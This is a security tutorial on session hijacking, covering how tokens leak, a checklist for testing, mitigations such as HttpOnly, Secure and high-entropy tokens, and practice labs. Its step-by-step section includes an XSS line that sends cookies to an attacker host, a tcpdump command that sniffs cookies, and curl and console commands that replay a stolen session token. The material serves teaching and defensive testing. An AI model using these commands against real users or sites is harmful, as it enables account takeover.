# What is Session Hijacking?

Session Hijacking is stealing or predicting a valid session token and using it to impersonate the user, no password required. If you have the token, you are the user for as long as it lives. Tokens leak through XSS, network sniffing on plaintext channels, weak generation, or careless logging.

## How tokens get stolen

- **XSS** - script reads a non-HttpOnly cookie and ships it out
- **Sniffing** - session sent over HTTP or mixed content
- **Predictable IDs** - sequential or low-entropy tokens can be guessed
- **Leakage** - tokens in URLs, logs, referrers, or error pages

## Step 1 - Obtain a token

```javascript
// Via XSS (only if the cookie is NOT HttpOnly)
new Image().src = 'https://attacker.oastify.com/?c=' + document.cookie;
```

```bash
# Via network sniffing (plaintext HTTP or stripped TLS)
tcpdump -A -i eth0 'tcp port 80' | grep -i "cookie:"
```

Other sources: tokens in URLs (leak via `Referer`), server logs, browser history, predictable/low-entropy IDs.

## Step 2 - Replay the token

```bash
# curl - just set the stolen cookie
curl https://target.tld/account -H "Cookie: SESSIONID=stolen_value_here"
```

```javascript
// Or set it in a browser console / EditThisCookie, then refresh
document.cookie = "SESSIONID=stolen_value_here; path=/";
```

If the account page loads as the victim, hijack successful.

## Step 3 - Assess token quality (predictability)

Feed many freshly issued tokens into **Burp Sequencer** to measure entropy. Sequential (`1001`, `1002`) or low-entropy tokens can be guessed/brute-forced instead of stolen.

## Tools

- [Burp Suite Sequencer](https://portswigger.net/burp) - measure token randomness/entropy
- [Wireshark](https://www.wireshark.org/) - spot tokens sent in the clear
- [mitmproxy](https://mitmproxy.org/) - intercept and replay sessions
- [Cookie-Editor / EditThisCookie](https://cookie-editor.com/) - inject a token into your browser

## Manual testing checklist

1. Grab a valid token from your own login; replay from another browser/IP - still works?
2. Confirm cookie flags: `HttpOnly`, `Secure`, `SameSite`.
3. Is the token rotated after login and invalidated on logout (server-side)?
4. Check entropy in Sequencer.
5. Hunt for tokens leaking in URLs, logs, or third-party requests.

## Mitigation - the fix

- Cookies: `HttpOnly` (blocks JS theft), `Secure` (HTTPS only), `SameSite`.
- Serve everything over HTTPS with **HSTS**.
- Generate **high-entropy** (128+ bit) unpredictable tokens from a CSPRNG.
- Rotate on login, expire on idle + absolute timeout, and **truly invalidate** on logout server-side.
- Optionally bind sessions to context (User-Agent/IP) with care.

## Practice

- PortSwigger authentication labs; OWASP Juice Shop

## Deep dive

- [Session Hijacking - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

## CWE

- CWE-384: Session Fixation (related)
- CWE-613: Insufficient Session Expiration
- CWE-330: Use of Insufficiently Random Values
